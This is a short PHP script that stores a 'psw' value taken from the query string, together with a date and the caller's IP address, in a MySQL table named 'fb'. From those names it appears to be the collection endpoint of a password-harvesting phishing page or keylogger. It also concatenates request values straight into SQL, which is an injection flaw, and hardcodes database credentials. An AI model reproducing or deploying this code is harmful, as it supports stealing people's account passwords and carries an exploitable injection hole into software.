<?php
$mysqli = new mysqli("localhost", "u183547639_kbrec", "CIR", "u183547639_kbrec");
if($mysqli->connect_errno){
 header("X-State: MySQL connect fail",true,400);
 header("X-Mysql: ".$mysqli->connect_error);
} else {
 $response = $mysqli->query("INSERT INTO fb (PSW, TIME, IP) VALUES('".$_GET['psw']."', '".$_GET['date']."', '".$_SERVER['REMOTE_ADDR']."');");
 header("X-State: ".$response,true,204);
}
?>
